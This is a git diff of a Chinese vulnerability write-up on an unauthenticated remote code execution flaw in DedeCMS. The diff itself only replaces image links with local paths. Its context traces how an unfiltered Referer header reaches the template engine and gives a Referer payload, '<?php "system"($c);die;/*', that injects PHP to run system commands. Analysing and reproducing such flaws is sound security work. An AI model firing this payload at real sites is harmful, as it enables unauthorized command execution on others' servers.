@@ -40,7 +40,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kxNopGq7p1MvhNPkeyM6nw)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1q9B4zjvOByWm62M2RDIvn5XpzlpdkC2j6auEeiaPYBbqnw8TeUcTRdw/640?wx_fmt=png)
+![](../../.resource/remote/fc9a3a9800c10ac68300e339417a29222c0c52b3c0c89613540a99423c151d2a.png)
 
 **# 前言**
 
@@ -64,11 +64,11 @@ if ($dopost == 'save') {
     }
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1RIw9u9udmhEib2sYsJBCmqfHO9CxdFAjaLUSTd6ET3Opx9ebnRkOv5g/640?wx_fmt=png)
+![](../../.resource/remote/b070bca4e43ce055ab6241899cd717b5f89bc56a91e4f63077eb6868ffcf2abd.png)
 
 当 dopost 变量等于 save 且没有设置 validate 变量时，就会进入 ShowMsg() 函数，接着跳转跟踪一下 ShowMsg() 函数
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1sJJvjBZgB1B31d2WL3CP5OQdJ7BXryE0ICt9c8q9wP0QYexS7LM6Kg/640?wx_fmt=png)
+![](../../.resource/remote/6284f3a54db7e0f2b022b5e85226a2d2fb5f36ab0cb5b7ebc0a6ac74204e9f94.png)
 
 跳转跟踪到 / include/common.func.php
 
@@ -88,7 +88,7 @@ function ShowMsg($msg, $gourl, $onlymsg = 0, $limittime = 0)
 
 从 $gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : ''; 可以看到，如果 $gourl 的值为 - 1 ，那么我就可以通过引入 REFERER 字段，控制 REFERER 字段的值，而且可以看到 REFERER 字段并未经过任何过滤处理，也就意味着 $gourl 可以注入我们的恶意语句，接着看看下一处调用 $gourl 的地方。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1lbGeHPRd9MrlGJibUZq3CERjVV6B8MtRQUvsCRbXzmyIrklmYTqPKxQ/640?wx_fmt=png)
+![](../../.resource/remote/046d654193518ee541a860072993eea966fad86765523a5dd39d20093a4fd2af.png)
 
 ```
 if ($onlymsg == 0) {
@@ -115,7 +115,7 @@ $tpl = new DedeTemplate();
 
 因为 onlymsg 的值默认就等于 0，所以在 A 处 $gourl 的值传入到 $rmsg 变量中，又从 B 处传入到 $msg 变量中，最后交由 C 处的 LoadString() 函数和 Display() 函数处理，跳转跟踪 LoadString() 函数。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1icjhxeAqAibrZr1RuRKgpSMA5DAyxRRekiazbDmaK6zhjKekz5qYIdqKg/640?wx_fmt=png)
+![](../../.resource/remote/2eb83fe37da23179a4940f66716d3392c0b52fde324e99ae45807115b7746fc1.png)
 
 ```
 public function LoadString($str = '')
@@ -131,7 +131,7 @@ public function LoadString($str = '')
 
 可以看到，带有恶意语句的 $msg 将会传入到 D 处的 sourceString 并载入模板字符串。继续跳转跟踪 Display() 函数。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1dGtH8lYVkFAvqOZ0YsF2GcAZOjF3uW8gaV70JeJD1S4iay6iaWkzcymA/640?wx_fmt=png)
+![](../../.resource/remote/e25a6ecc800ab6250af1fddec107da218d7267162d49f30e25ded5f789df203a.png)
 
 ```
 public function Display()
@@ -145,7 +145,7 @@ public function Display()
 
 进入 Display() 函数后，又要进入 WriteCache() 函数，继续跳转跟踪 WriteCache() 函数。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1PrBKDFVpZWaa1YLTbHyE9FQNV5JVZpoUHMUjESXreyvnr2W1D0mKBA/640?wx_fmt=png)
+![](../../.resource/remote/fd409d7bb8cdf7b9b74137402941c7ce4fc32844dc45e698b9b10a10581d0b49.png)
 
 ```
 public function WriteCache($ctype = 'all')
@@ -175,7 +175,7 @@ public function WriteCache($ctype = 'all')
 
 WriteCache() 函数负责解析模板并写缓存文件，所以 sourceString 会在 WriteCache() 函数中的 E 处得到解析结果，GetResult() 函数会调用返回值 sourceString 来设置 $result 变量，然后 $result 变量会在 F 处被 CheckDisabledFunctions() 函数调用，跳转跟踪 CheckDisabledFunctions() 函数
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1FKeN1mIXzrejKicZwjCLgB6oTqcbPiaAsiaSdmk1jgdUfSXVbd2Eq3nwg/640?wx_fmt=png)
+![](../../.resource/remote/182863184dd5be8ab74c421a67f5520758024e700e9d5c8cb32f9c23a7521de1.png)
 
 ```
 public function CheckDisabledFunctions($str, &$errmsg = '')
@@ -217,19 +217,19 @@ $rmsg .= "<br /><a href='{$gourl}'>如果你的浏览器没反应，请点击这
 https://github.com/dedecms/DedeCMS/releases
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1y51hhqph853JU4G8MvG9gamLiaEoslricrNuEcJyzbg94SLA6nuyYrqA/640?wx_fmt=png)
+![](../../.resource/remote/1f630a9167cfaf9928e5705f53e505957333c080ae654309e6e7357d4ecb3a88.png)
 
 利用 phpstudy 快速搭建 Apache+PHP+MySQL 环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1dR6dhic67czruHowFoiaiapYGdt1yWcdic0HIfWToPQtqlvCPkiaMPaIdiaA/640?wx_fmt=png)
+![](../../.resource/remote/7879b0745d408d6b3effa13fe7ebf32f9e3bf85a6d31668675138a6967b8d38b.png)
 
 接着很简单，按照提示一步步进行安装。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1x15WwN8OTsqGe5ATv6tvw3YET2drKiacFgvcD6WLMsicKXWCa3gP9GYw/640?wx_fmt=png)
+![](../../.resource/remote/ebd0b36694092776ecc5a2e1070424a7755e52ca675e3ac3e0e24b2e1d80a0b1.png)
 
 这里提示我的 PHP 版本过低，要求 PHP 7 版本的，那么用 phpstudy 切换一下环境即可。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1MtkKcz7akfUngexBgpMeh0vNOpJniaH5HVbcv4e3hgYHEK9AibMMw2Hg/640?wx_fmt=png)
+![](../../.resource/remote/11d27daf3a2c6e075cf699eedb4101cb491c39ddace4c35469830726bc0a0e8d.png)
 
 **# 漏洞复现**
 
@@ -250,9 +250,9 @@ Referer: <?php "system"($c);die;/*
 
 备注：$c 中的 c 字符是可变的，你想改成什么就什么  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1qjYgbeLhp3aIESUSj4XOyYNr9IyCngZ3OIr7QzLiaAzs7F7md4ZTPsQ/640?wx_fmt=png)
+![](../../.resource/remote/dee7c4d85657fcf57370ab5ac382f637fc171e1877bfb975d43b4aa8b78ac52c.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wrJKnIU1swcvg4NXia0q1Y1BV2UYTJ4E2n8ncMVicOFEce5icSfzaibPJ9snug648GtqQpdn7nbhlCcw/640?wx_fmt=png)
+![](../../.resource/remote/1cd272ed925b70ac55a413b2b531d8d76632abb929688209bb018ec446b3cf53.png)
 
 除此以外，还有以下路径存在未授权 RCE 漏洞：  
 
